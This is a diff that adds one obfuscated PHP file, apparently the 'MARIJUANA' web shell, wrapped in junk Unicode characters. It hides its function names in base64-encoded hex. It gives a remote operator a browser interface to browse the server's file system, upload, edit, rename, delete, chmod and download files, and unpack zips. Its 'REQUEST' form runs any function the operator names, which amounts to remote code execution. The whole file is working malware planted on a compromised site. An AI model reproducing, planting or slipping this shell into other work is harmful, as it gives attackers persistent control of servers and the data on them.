@@ -1,0 +1,448 @@
+ሚಮ0б​aઅે​ንቬCୁபѪйភпໂ<?php header(base64_decode('WC1YU1MtUHJvdGVjdGlvbjogMA=='));ob_start();set_time_limit(0);error_reporting(0);ini_set(base64_decode('ZGlzcGxheV9lcnJvcnM='), FALSE);
+$q7 = [
+		base64_decode('NzA2ODcwNWY3NTZlNjE2ZDY1'),
+		base64_decode('NzA2ODcwNzY2NTcyNzM2OTZmNmU='),
+		base64_decode('NjM2ODY0Njk3Mg=='),
+		base64_decode('Njc2NTc0NjM3NzY0'),
+		base64_decode('NzA3MjY1Njc1ZjczNzA2YzY5NzQ='),
+		base64_decode('NjM2ZjcwNzk='),
+		base64_decode('NjY2OTZjNjU1ZjY3NjU3NDVmNjM2ZjZlNzQ2NTZlNzQ3Mw=='),
+		base64_decode('NjI2MTczNjUzNjM0NWY2NDY1NjM2ZjY0NjU='),
+		base64_decode('Njk3MzVmNjQ2OTcy'),
+		base64_decode('NmY2MjVmNjU2ZTY0NWY2MzZjNjU2MTZlMjgyOTNi'),
+		base64_decode('NzU2ZTZjNjk2ZTZi'),
+		base64_decode('NmQ2YjY0Njk3Mg=='),
+		base64_decode('NjM2ODZkNmY2NA=='),
+		base64_decode('NzM2MzYxNmU2NDY5NzI='),
+		base64_decode('NzM3NDcyNWY3MjY1NzA2YzYxNjM2NQ=='),
+		base64_decode('Njg3NDZkNmM3MzcwNjU2MzY5NjE2YzYzNjg2MTcyNzM='),
+		base64_decode('NzY2MTcyNWY2NDc1NmQ3MA=='),
+		base64_decode('NjY2ZjcwNjU2ZQ=='),
+		base64_decode('NjY3NzcyNjk3NDY1'),
+		base64_decode('NjY2MzZjNmY3MzY1'),
+		base64_decode('NjQ2MTc0NjU='),
+		base64_decode('NjY2OTZjNjU2ZDc0Njk2ZDY1'),
+		base64_decode('NzM3NTYyNzM3NDcy'),
+		base64_decode('NzM3MDcyNjk2ZTc0NjY='),
+		base64_decode('NjY2OTZjNjU3MDY1NzI2ZDcz'),
+		base64_decode('NzQ2Zjc1NjM2OA=='),
+		base64_decode('NjY2OTZjNjU1ZjY1Nzg2OTczNzQ3Mw=='),
+		base64_decode('NzI2NTZlNjE2ZDY1'),
+		base64_decode('Njk3MzVmNjE3MjcyNjE3OQ=='),
+		base64_decode('Njk3MzVmNmY2MjZhNjU2Mzc0'),
+		base64_decode('NzM3NDcyNzA2Zjcz'),
+		base64_decode('Njk3MzVmNzc3MjY5NzQ2MTYyNmM2NQ=='),
+		base64_decode('Njk3MzVmNzI2NTYxNjQ2MTYyNmM2NQ=='),
+		base64_decode('NzM3NDcyNzQ2Zjc0Njk2ZDY1'),
+		base64_decode('NjY2OTZjNjU3MzY5N2E2NQ=='),
+		base64_decode('NzI2ZDY0Njk3Mg=='),
+		base64_decode('NmY2MjVmNjc2NTc0NWY2MzZjNjU2MTZl'),
+		base64_decode('NzI2NTYxNjQ2NjY5NmM2NQ=='),
+		base64_decode('NjE3MzczNjU3Mjc0'),
+];
+$p8 = count($q7);
+for($d9=0;$d9<$p8;$d9++) {
+	$z10[] = x3($q7[$d9]);
+}
+?>
+<!DOCTYPE html>
+	<html dir="auto" lang="en-US">
+
+		<head>
+			<meta charset="UTF-8">
+			<meta name="robots" content="NOINDEX, NOFOLLOW">
+
+				<title>உ</title>
+
+			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
+			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
+
+			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
+		</head>
+
+		<body>
+			<header>
+				<div class="y x">
+					<a class="ajx" href="<?php echo basename($_SERVER[base64_decode('UEhQX1NFTEY=')]);?>">
+						உ
+					</a>
+				</div>
+
+				<div class="q x w">
+					&#8212; DIOS &#8212; NO &#8212; CREA &#8212; NADA &#8212; EN &#8212; VANO &#8212;
+				</div>
+				
+			</header>
+
+			<article>
+				<div class="i">
+					<i class="far fa-hdd"></i>
+					<?php echo $z10[0]();?>
+
+					<br />
+
+					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER[base64_decode('U0VSVkVSX1NPRlRXQVJF')];?> <b>PHP :</b> <?php echo $z10[1]();?>
+
+					<br />
+
+					<i class="far fa-folder"></i>
+					
+					<?php 					if(isset($_GET[base64_decode('ZA==')])) {
+						$g11 = x3($_GET[base64_decode('ZA==')]);
+						$z10[2](x3($_GET[base64_decode('ZA==')]));
+					}
+					else {
+						$g11 = $z10[3]();
+					}
+					$x12 = $z10[4](base64_decode('LyhcfC8pLw=='), $g11 );
+					foreach ($x12 as $d13 => $n14) { 
+						if($n14=='' && $d13==0) {
+							echo base64_decode('PGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9MmYiPi88L2E+');
+						}
+						if($n14 == '') { 
+							continue;
+						}
+						echo base64_decode('PGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9');
+						for ($d9 = 0; $d9 <= $d13; $d9++) {
+							echo n2($x12[$d9]); 
+							if($d9 != $d13) {
+								echo base64_decode('MmY=');
+							}
+						}
+						echo base64_decode('Ij4=').$n14.base64_decode('PC9hPi8='); 
+					}
+					?>
+
+					<br />
+
+				</div>
+
+				<div class="u">
+					<?php echo $_SERVER[base64_decode('U0VSVkVSX0FERFI=')];?> <i class="fas fa-link"></i>
+					<br />
+
+					<br />
+
+					<form method="post" enctype="multipart/form-data">
+						<label class="l w">
+							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
+						</label>&nbsp;
+					</form>
+
+					<?php 					$p15 = [ 
+							base64_decode('PHNjcmlwdD4kLm5vdGlmeSgi'),
+							base64_decode('IiwgeyBjbGFzc05hbWU6IjEiLGF1dG9IaWRlRGVsYXk6IDIwMDAscG9zaXRpb246ImxlZnQgYm90dG9tIiB9KTs8L3NjcmlwdD4=')
+						];
+					$b16 = $p15[0].base64_decode('T0sh').$p15[1];
+					$m17 = $p15[0].base64_decode('RVIh').$p15[1];
+					if(isset($_FILES[base64_decode('bg==')])) {
+						$y18 = $_FILES[base64_decode('bg==')][base64_decode('bmFtZQ==')];
+						$f19 = count($y18);
+						for( $d9=0 ; $d9 < $f19 ; $d9++ ) {
+							if($z10[5]($_FILES[base64_decode('bg==')][base64_decode('dG1wX25hbWU=')][$d9], $y18[$d9])) {
+								echo $b16;
+							}
+							else {
+								echo $m17;
+							}
+						}
+					}
+					?>
+
+				</div>
+					<?php 					$q20 = base64_decode('PHRhYmxlIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iNyIgd2lkdGg9IjEwMCUiPg0KCQkJCQkJPHRoZWFkPg0KCQkJCQkJCTx0cj4NCgkJCQkJCQkJPHRoPg==');
+					$u21 = base64_decode('PC90aD4NCgkJCQkJCQk8L3RyPg0KCQkJCQkJPC90aGVhZD4NCgkJCQkJCTx0Ym9keT4NCgkJCQkJCQk8dHI+DQoJCQkJCQkJCTx0ZD48L3RkPg0KCQkJCQkJCTwvdHI+DQoJCQkJCQkJPHRyPg0KCQkJCQkJCQk8dGQgY2xhc3M9IngiPg==');
+					$r22 = base64_decode('PC90ZD4NCgkJCQkJCQk8L3RyPg0KCQkJCQkJPC90Ym9keT4NCgkJCQkJPC90YWJsZT4=');
+					$h23 = base64_decode('PGJyIC8+DQoJCQkJCQkJCQkJPGJyIC8+DQoJCQkJCQkJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9InciIHZhbHVlPSImbmJzcDtPSyZuYnNwOyIgLz4NCgkJCQkJCQkJCTwvZm9ybT4=');
+					if(isset($_GET[base64_decode('cw==')])) {
+						echo $q20.x3($_GET[base64_decode('cw==')]).$u21.base64_decode('DQoJCQkJCQkJCQk8dGV4dGFyZWEgcmVhZG9ubHk9InllcyI+').$z10[15]($z10[6](x3($_GET[base64_decode('cw==')]))).base64_decode('PC90ZXh0YXJlYT4NCgkJCQkJCQkJCTxiciAvPg0KCQkJCQkJCQkJPGJyIC8+DQoJCQkJCQkJCQk8aW5wdXQgb25jbGljaz0ibG9jYXRpb24uaHJlZj1cJz9kPQ==').$_GET[base64_decode('ZA==')].base64_decode('JmU9').$_GET[base64_decode('cw==')].base64_decode('XCciIHR5cGU9InN1Ym1pdCIgY2xhc3M9InciIHZhbHVlPSImbmJzcDtFRElUJm5ic3A7IiAvPg0KCQkJCQkJCQk=').$r22;
+					}
+					elseif(isset($_GET[base64_decode('eQ==')])) {
+						echo $q20.base64_decode('UkVRVUVTVA==').$u21.base64_decode('DQoJCQkJCQkJCQk8Zm9ybSBtZXRob2Q9InBvc3QiPg0KCQkJCQkJCQkJCTxpbnB1dCBjbGFzcz0ieCIgdHlwZT0idGV4dCIgbmFtZT0iMSIgLz4mbmJzcDsmbmJzcDsNCgkJCQkJCQkJCQk8aW5wdXQgY2xhc3M9IngiIHR5cGU9InRleHQiIG5hbWU9IjIiIC8+DQoJCQkJCQkJCQkJ').$h23.base64_decode('DQoJCQkJCQkJCQk8YnIgLz4NCgkJCQkJCQkJCTx0ZXh0YXJlYSByZWFkb25seT0ieWVzIj4=');
+
+									if(isset($_POST[base64_decode('Mg==')])) {
+										echo $z10[15](q1($_POST[base64_decode('MQ==')], $_POST[base64_decode('Mg==')]));
+									}
+
+								echo base64_decode('PC90ZXh0YXJlYT4NCgkJCQkJCQkJ').$r22;
+					}
+					elseif(isset($_GET[base64_decode('ZQ==')])) {
+						echo $q20.x3($_GET[base64_decode('ZQ==')]).$u21.base64_decode('DQoJCQkJCQkJCQk8Zm9ybSBtZXRob2Q9InBvc3QiPg0KCQkJCQkJCQkJCTx0ZXh0YXJlYSBuYW1lPSJlIiBjbGFzcz0ibyI+').$z10[15]($z10[6](x3($_GET[base64_decode('ZQ==')]))).base64_decode('PC90ZXh0YXJlYT4NCgkJCQkJCQkJCQk8YnIgLz4NCgkJCQkJCQkJCQk8YnIgLz4NCgkJCQkJCQkJCQk8c3BhbiBjbGFzcz0idyI+QkFTRTY0PC9zcGFuPiA6DQoJCQkJCQkJCQkJPHNlbGVjdCBpZD0iYjY0IiBuYW1lPSJiNjQiPg0KCQkJCQkJCQkJCQk8b3B0aW9uIHZhbHVlPSIwIj5OTzwvb3B0aW9uPg0KCQkJCQkJCQkJCQk8b3B0aW9uIHZhbHVlPSIxIj5ZRVM8L29wdGlvbj4NCgkJCQkJCQkJCQk8L3NlbGVjdD4NCgkJCQkJCQkJCQk=').$h23.base64_decode('DQoJCQkJCQkJCQ==').$r22.base64_decode('DQoJCQkJCQkJCQ0KCQkJCQk8c2NyaXB0Pg0KCQkJCQkJJCgiI2I2NCIpLmNoYW5nZShmdW5jdGlvbigpIHsNCgkJCQkJCQlpZigkKCIjYjY0IG9wdGlvbjpzZWxlY3RlZCIpLnZhbCgpID09IDApIHsNCgkJCQkJCQkJdmFyIFggPSAkKCJ0ZXh0YXJlYSIpLnZhbCgpOw0KCQkJCQkJCQl2YXIgWiA9IGF0b2IoWCk7DQoJCQkJCQkJCSQoInRleHRhcmVhIikudmFsKFopOw0KCQkJCQkJCX0NCgkJCQkJCQllbHNlIHsNCgkJCQkJCQkJdmFyIE4gPSAkKCJ0ZXh0YXJlYSIpLnZhbCgpOw0KCQkJCQkJCQl2YXIgSSA9IGJ0b2EoTik7DQoJCQkJCQkJCSQoInRleHRhcmVhIikudmFsKEkpOw0KCQkJCQkJCX0NCgkJCQkJCX0pOw0KCQkJCQk8L3NjcmlwdD4=');
+					if(isset($_POST[base64_decode('ZQ==')])) {
+						if($_POST[base64_decode('YjY0')] == base64_decode('MQ==')) {
+							$n24 = $z10[7]($_POST[base64_decode('ZQ==')]);
+						}
+						else {
+							$n24 = $_POST[base64_decode('ZQ==')];
+						}
+						$s25 = $z10[17](x3($_GET[base64_decode('ZQ==')]), base64_decode('dw=='));
+						if($z10[18]($s25, $n24)) {
+							z4();
+						}
+						else {
+							h5();
+						}
+						$z10[19]($s25);
+					  }
+					}
+					elseif(isset($_GET[base64_decode('eA==')])) {
+						t0(x3($_GET[base64_decode('eA==')]));
+						if($z10[26](x3($_GET[base64_decode('eA==')]))) {
+							h5();
+						}
+						else {
+							z4();
+						}
+
+					}
+					elseif(isset($_GET[base64_decode('dA==')])) {
+						echo $q20.x3($_GET[base64_decode('dA==')]).$u21.base64_decode('DQoJCQkJCQkJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCgkJCQkJCQkJCQk8aW5wdXQgbmFtZT0idCIgY2xhc3M9IngiIHR5cGU9InRleHQiIHZhbHVlPSI=').$z10[20](base64_decode('WS1tLWQgSDpp'), $z10[21](x3($_GET[base64_decode('dA==')]))).base64_decode('Ij4NCgkJCQkJCQkJCQk=').$h23.base64_decode('DQoJCQkJCQkJCQ==').$r22;
+					if( !empty($_POST[base64_decode('dA==')]) ) {
+						$g26 = $z10[33]($_POST[base64_decode('dA==')]);
+						if($g26) {
+							if(!$z10[25](x3($_GET[base64_decode('dA==')]),$g26,$g26)) {
+								h5();
+							}
+							else {
+								z4();
+							}
+						}
+						else {
+							h5();
+						}
+					  }
+					}
+					elseif(isset($_GET[base64_decode('aw==')])) {
+						echo $q20.x3($_GET[base64_decode('aw==')]).$u21.base64_decode('DQoJCQkJCQkJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCgkJCQkJCQkJCQk8aW5wdXQgbmFtZT0iYiIgY2xhc3M9IngiIHR5cGU9InRleHQiIHZhbHVlPSI=').$z10[22]($z10[23](base64_decode('JW8='), $z10[24](x3($_GET[base64_decode('aw==')]))), -4).base64_decode('Ij4NCgkJCQkJCQkJCQk=').$h23.base64_decode('DQoJCQkJCQkJCQ==').$r22;
+					if(!empty($_POST[base64_decode('Yg==')])) {
+						$k27 = $_POST[base64_decode('Yg==')];
+						$a28 = 0;
+					for($d9=strlen($k27)-1;$d9>=0;--$d9)
+						$a28 += (int)$k27[$d9]*pow(8, (strlen($k27)-$d9-1));
+					if(!$z10[12](x3($_GET[base64_decode('aw==')]), $a28)) {
+						h5();
+					}
+					else {
+						z4();
+						  }
+						}
+					}
+					elseif(isset($_GET[base64_decode('bA==')])) {
+						echo $q20.base64_decode('K0RJUg==').$u21.base64_decode('DQoJCQkJCQkJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCgkJCQkJCQkJCQk8aW5wdXQgbmFtZT0ibCIgY2xhc3M9IngiIHR5cGU9InRleHQiIHZhbHVlPSIiPg0KCQkJCQkJCQkJCQ==').$h23.base64_decode('DQoJCQkJCQkJCQ==').$r22;
+					if(isset($_POST[base64_decode('bA==')])) {
+						if(!$z10[11]($_POST[base64_decode('bA==')])) {
+							h5();
+						}
+						else {
+							z4();
+						}
+					  }
+					}
+					elseif(isset($_GET[base64_decode('cQ==')])) {
+						if($z10[10](__FILE__)) {
+							$z10[38]($z10[9]);
+							header(base64_decode('TG9jYXRpb246IA==').basename($_SERVER[base64_decode('UEhQX1NFTEY=')]).'');
+							exit();
+						}
+						else {
+							echo $m17;
+						}
+					}
+					elseif(isset($_GET[base64_decode('bg==')])) {
+						echo $q20.base64_decode('K0ZJTEU=').$u21.base64_decode('DQoJCQkJCQkJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCgkJCQkJCQkJCQk8aW5wdXQgbmFtZT0ibiIgY2xhc3M9IngiIHR5cGU9InRleHQiIHZhbHVlPSIiPg0KCQkJCQkJCQkJCQ==').$h23.base64_decode('DQoJCQkJCQkJCQ==').$r22;
+					if(isset($_POST[base64_decode('bg==')])) {
+						if(!$z10[25]($_POST[base64_decode('bg==')])) {
+							h5();
+						}
+						else {
+							z4();
+						}
+					  }
+					}
+					elseif(isset($_GET[base64_decode('cg==')])) {
+						echo $q20.x3($_GET[base64_decode('cg==')]).$u21.base64_decode('DQoJCQkJCQkJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCgkJCQkJCQkJCQk8aW5wdXQgbmFtZT0iciIgY2xhc3M9IngiIHR5cGU9InRleHQiIHZhbHVlPSI=').x3($_GET[base64_decode('cg==')]).base64_decode('Ij4NCgkJCQkJCQkJCQk=').$h23.base64_decode('DQoJCQkJCQkJCQ==').$r22;
+					if(isset($_POST[base64_decode('cg==')])) {
+						if($z10[26]($_POST[base64_decode('cg==')])) {
+							h5();
+						}
+						else {
+							if($z10[27](x3($_GET[base64_decode('cg==')]), $_POST[base64_decode('cg==')])) {
+								z4();
+							}
+							else {
+								h5();
+							}
+						  }
+					   }
+					}
+					elseif(isset($_GET[base64_decode('eg==')])) {
+						$h29 = new y30;
+						$o31 = $h29->p32(x3($_GET[base64_decode('eg==')]));
+							if($o31 === TRUE) {
+								$h29->e33(x3($_GET[base64_decode('ZA==')]));
+								$h29->p34();
+								z4();
+							} else {
+								h5();
+						  }
+					}
+					else {
+					echo base64_decode('PHRhYmxlIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iNyIgd2lkdGg9IjEwMCUiPg0KCQkJCQkJPHRoZWFkPg0KCQkJCQkJCTx0cj4NCgkJCQkJCQkJPHRoIHdpZHRoPSI0NCUiPlsgTkFNRSBdPC90aD4NCgkJCQkJCQkJPHRoIHdpZHRoPSIxMSUiPlsgU0laRSBdPC90aD4NCgkJCQkJCQkJPHRoIHdpZHRoPSIxNyUiPlsgUEVSTSBdPC90aD4NCgkJCQkJCQkJPHRoIHdpZHRoPSIxNyUiPlsgREFURSBdPC90aD4NCgkJCQkJCQkJPHRoIHdpZHRoPSIxMSUiPlsgQUNUIF08L3RoPg0KCQkJCQkJCTwvdHI+DQoJCQkJCQk8L3RoZWFkPg0KCQkJCQkJPHRib2R5Pg0KCQkJCQkJCTx0cj4NCgkJCQkJCQkJPHRkPg0KCQkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9').n2($g11).base64_decode('Jm4iPitGSUxFPC9hPg0KCQkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9').n2($g11).base64_decode('JmwiPitESVI8L2E+DQoJCQkJCQkJCTwvdGQ+DQoJCQkJCQkJPC90cj4NCgkJCQkJCQ==');
+
+							$q35 = '';
+							$v36 = '';
+							$d37 = $z10[13]($g11);
+							if($z10[28]($d37) || $z10[29]($d37)) {
+							foreach($d37 as $x38){
+								$x39 = $z10[14](base64_decode('XA=='), base64_decode('Lw=='), $g11);
+								if(!$z10[30]($x38, base64_decode('LnppcA=='))) {
+									$r40 = '';
+								}
+								else {
+									$r40 = base64_decode('PGEgaHJlZj0iP2Q9').n2($x39).base64_decode('Jno9').n2($x38).base64_decode('Ij5VPC9hPg==');
+								}
+								if($z10[31]("$g11/$x38")) {
+										$f41 = '';
+								}
+								elseif(!$z10[32]("$g11/$x38")) {
+										$f41 = base64_decode('IGg=');
+								}
+								else {
+										$f41 = base64_decode('IHc=');
+								}
+								$h42 = $z10[34]("$g11/$x38") / 1024;
+								$h42 = round($h42, 3);
+								if($h42>=1024) { 
+									$h42 = round($h42/1024, 2) . base64_decode('IE1C');
+								} else {
+									$h42 = $h42 . base64_decode('IEtC');
+								}
+							if(($x38 != base64_decode('Lg==')) && ($x38 != base64_decode('Li4='))){
+								($z10[8]("$g11/$x38")) ?
+								$q35 .= base64_decode('PHRyIGNsYXNzPSJyIj4NCgkJCQkJCQk8dGQ+DQoJCQkJCQkJCTxpIGNsYXNzPSJmYXIgZmEtZm9sZGVyIG0iPjwvaT4NCgkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9').n2($x39).n2(base64_decode('Lw==').$x38).base64_decode('Ij4=').$x38.base64_decode('PC9hPg0KCQkJCQkJCTwvdGQ+DQoJCQkJCQkJPHRkIGNsYXNzPSJ4Ij4NCgkJCQkJCQkJZGlyDQoJCQkJCQkJPC90ZD4NCgkJCQkJCQk8dGQgY2xhc3M9IngiPg0KCQkJCQkJCQk8YSBjbGFzcz0iYWp4').$f41.base64_decode('IiBocmVmPSI/ZD0=').n2($x39).base64_decode('Jms9').n2($x38).base64_decode('Ij4=').i6("$g11/$x38").base64_decode('PC9hPg0KCQkJCQkJCTwvdGQ+DQoJCQkJCQkJPHRkIGNsYXNzPSJ4Ij4NCgkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9').n2($x39).base64_decode('JnQ9').n2($x38).base64_decode('Ij4=').$z10[20](base64_decode('WS1tLWQgSDpp'), $z10[21]("$g11/$x38")).base64_decode('PC9hPg0KCQkJCQkJCTwvdGQ+DQoJCQkJCQkJPHRkIGNsYXNzPSJ4Ij4NCgkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9').n2($x39).base64_decode('JnI9').n2($x38).base64_decode('Ij5SPC9hPg0KCQkJCQkJCQk8YSBocmVmPSI/ZD0=').n2($x39).base64_decode('Jng9').n2($x38).base64_decode('Ij5EPC9hPg0KCQkJCQkJCTwvdGQ+DQoJCQkJCQk8L3RyPg0KCQkJCQkJDQoJCQkJCQk=')
+							:
+								$v36 .= base64_decode('PHRyIGNsYXNzPSJyIj4NCgkJCQkJCQk8dGQ+DQoJCQkJCQkJCTxpIGNsYXNzPSJmYXIgZmEtZmlsZSBtIj48L2k+JnRoaW5zcDsNCgkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9').n2($x39).base64_decode('JnM9').n2($x38).base64_decode('Ij4=').$x38.base64_decode('PC9hPg0KCQkJCQkJCTwvdGQ+DQoJCQkJCQkJPHRkIGNsYXNzPSJ4Ij4NCgkJCQkJCQkJ').$h42.base64_decode('DQoJCQkJCQkJPC90ZD4NCgkJCQkJCQk8dGQgY2xhc3M9IngiPg0KCQkJCQkJCQk8YSBjbGFzcz0iYWp4').$f41.base64_decode('IiBocmVmPSI/ZD0=').n2($x39).base64_decode('Jms9').n2($x38).base64_decode('Ij4=').i6("$g11/$x38").base64_decode('PC9hPg0KCQkJCQkJCTwvdGQ+DQoJCQkJCQkJPHRkIGNsYXNzPSJ4Ij4NCgkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9').n2($x39).base64_decode('JnQ9').n2($x38).base64_decode('Ij4=').$z10[20](base64_decode('WS1tLWQgSDpp'), $z10[21]("$g11/$x38")).base64_decode('PC9hPg0KCQkJCQkJCTwvdGQ+DQoJCQkJCQkJPHRkIGNsYXNzPSJ4Ij4NCgkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9').n2($x39).base64_decode('JnI9').n2($x38).base64_decode('Ij5SPC9hPg0KCQkJCQkJCQk8YSBjbGFzcz0iYWp4IiBocmVmPSI/ZD0=').n2($x39).base64_decode('JmU9').n2($x38).base64_decode('Ij5FPC9hPg0KCQkJCQkJCQk8YSBocmVmPSI/ZD0=').n2($x39).base64_decode('Jmc9').n2($x38).base64_decode('Ij5HPC9hPg0KCQkJCQkJCQk=').$r40.base64_decode('DQoJCQkJCQkJCTxhIGhyZWY9Ij9kPQ==').n2($x39).base64_decode('Jng9').n2($x38).base64_decode('Ij5EPC9hPg0KCQkJCQkJCTwvdGQ+DQoJCQkJCQk8L3RyPg0KCQkJCQkJDQoJCQkJCQk=');
+
+							}
+						}
+					}
+
+						echo $q35;
+						echo $v36;
+						echo base64_decode('PC90Ym9keT4NCgkJCQkJCTx0Zm9vdD4NCgkJCQkJCQk8dHI+DQoJCQkJCQkJCTx0aCBjbGFzcz0iZXQiPg0KCQkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9').n2($x39).base64_decode('JnkiPlJFUVVFU1Q8L2E+DQoJCQkJCQkJCQk8YSBocmVmPSI/ZD0=').n2($x39).base64_decode('JnEiPkVYSVQ8L2E+DQoJCQkJCQkJCTwvdGg+DQoJCQkJCQkJCTx0aCBjbGFzcz0iZXQiIHdpZHRoPSIxMSUiPjwvdGg+DQoJCQkJCQkJCTx0aCBjbGFzcz0iZXQiIHdpZHRoPSIxNyUiPjwvdGg+DQoJCQkJCQkJCTx0aCBjbGFzcz0iZXQiIHdpZHRoPSIxNyUiPjwvdGg+DQoJCQkJCQkJCTx0aCBjbGFzcz0iZXQiIHdpZHRoPSIxMSUiPjwvdGg+DQoJCQkJCQkJPC90cj4NCgkJCQkJPC90Zm9vdD4NCgkJCQk8L3RhYmxlPg==');
+					}
+					?>
+
+			</article>
+			<footer class="x">
+				&copy;TheAlmightyZeus
+			</footer>
+			<?php 			if(isset($_GET[base64_decode('MQ==')])) {
+				echo $b16;
+			}
+			elseif(isset($_GET[base64_decode('MA==')])) {
+				echo $m17;
+			}
+			else {
+				NULL;
+			}
+			?>
+
+			<script>
+				$(".ajx").click(function(t){t.preventDefault();var e=$(this).attr("href");history.pushState("","",e),$.get(e,function(t){$("body").html(t)})});
+			</script>
+		</body>
+	</html>
+<?php 	function t0($v36) {
+		global $z10;
+		if(trim(pathinfo($v36, PATHINFO_BASENAME ), base64_decode('Lg==')) === '') {
+			return;
+		}
+		if($z10[8]($v36)) {
+			array_map(base64_decode('cmVj'), glob($v36 . DIRECTORY_SEPARATOR . base64_decode('eywufSo='), GLOB_BRACE | GLOB_NOSORT));
+			$z10[35]($v36);
+		}
+		else {
+			$z10[10]($v36);
+		}
+	}
+	function q1($l43, $l44) {
+		global $z10;
+		ob_start();
+		$z10[16]($l43($l44));
+		return $z10[36]();
+	}
+	function n2($u45) {
+		$k46='';
+		for ($d9=0; $d9 < strlen($u45); $d9++){
+			$k46 .= dechex(ord($u45[$d9]));
+		}
+		return $k46;
+	}
+	function x3($k46) {
+		$u45='';
+		for ($d9=0; $d9 < strlen($k46)-1; $d9+=2){
+			$u45 .= chr(hexdec($k46[$d9].$k46[$d9+1]));
+		}
+		return $u45;
+	}
+	function z4() {
+		global $z10, $g11;
+		$z10[38]($z10[9]);
+		header(base64_decode('TG9jYXRpb246ID9kPQ==').n2($g11).base64_decode('JjE='));
+		exit();
+	}
+	function h5() {
+		global $z10, $g11;
+		$z10[38]($z10[9]);
+		header(base64_decode('TG9jYXRpb246ID9kPQ==').n2($g11).base64_decode('JjA='));
+		exit();
+	}
+	function i6($x38) {
+		global $z10;
+		$k27 = $z10[24]($x38);
+		if(($k27 & 0xC000) == 0xC000) {
+			$t47 = base64_decode('cw==');
+		}
+		elseif(($k27 & 0xA000) == 0xA000) {
+			$t47 = base64_decode('bA==');
+		}
+		elseif(($k27 & 0x8000) == 0x8000) {
+			$t47 = base64_decode('LQ==');
+		}
+		elseif(($k27 & 0x6000) == 0x6000) {
+			$t47 = base64_decode('Yg==');
+		}
+		elseif(($k27 & 0x4000) == 0x4000) {
+			$t47 = base64_decode('ZA==');
+		}
+		elseif(($k27 & 0x2000) == 0x2000) {
+			$t47 = base64_decode('Yw==');
+		}
+		elseif(($k27 & 0x1000) == 0x1000) {
+			$t47 = base64_decode('cA==');
+		}
+		else {
+			$t47 = base64_decode('dQ==');
+		}
+		$t47 .= (($k27 & 0x0100) ? base64_decode('cg==') : base64_decode('LQ=='));
+		$t47 .= (($k27 & 0x0080) ? base64_decode('dw==') : base64_decode('LQ=='));
+		$t47 .= (($k27 & 0x0040) ? (($k27 & 0x0800) ? base64_decode('cw==') : base64_decode('eA==')) : (($k27 & 0x0800) ? base64_decode('Uw==') : base64_decode('LQ==')));
+		$t47 .= (($k27 & 0x0020) ? base64_decode('cg==') : base64_decode('LQ=='));
+		$t47 .= (($k27 & 0x0010) ? base64_decode('dw==') : base64_decode('LQ=='));
+		$t47 .= (($k27 & 0x0008) ? (($k27 & 0x0400) ? base64_decode('cw==') : base64_decode('eA==')) : (($k27 & 0x0400) ? base64_decode('Uw==') : base64_decode('LQ==')));
+		$t47 .= (($k27 & 0x0004) ? base64_decode('cg==') : base64_decode('LQ=='));
+		$t47 .= (($k27 & 0x0002) ? base64_decode('dw==') : base64_decode('LQ=='));
+		$t47 .= (($k27 & 0x0001) ? (($k27 & 0x0200) ? base64_decode('dA==') : base64_decode('eA==')) : (($k27 & 0x0200) ? base64_decode('VA==') : base64_decode('LQ==')));
+		return $t47;
+	}
+	if(isset($_GET[base64_decode('Zw==')])) {
+		$z10[38]($z10[9]);
+		header(base64_decode('Q29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0='));
+		header(base64_decode('Q29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogQmluYXJ5'));
+		header(base64_decode('Q29udGVudC1MZW5ndGg6IA==').$z10[34](x3($_GET[base64_decode('Zw==')])));
+		header(base64_decode('Q29udGVudC1kaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Ig==').x3($_GET[base64_decode('Zw==')]).base64_decode('Ig=='));
+		$z10[37](x3($_GET[base64_decode('Zw==')]));
+	}
+?>ቈ³கየभคિ્પតOુއ̃бị្່б
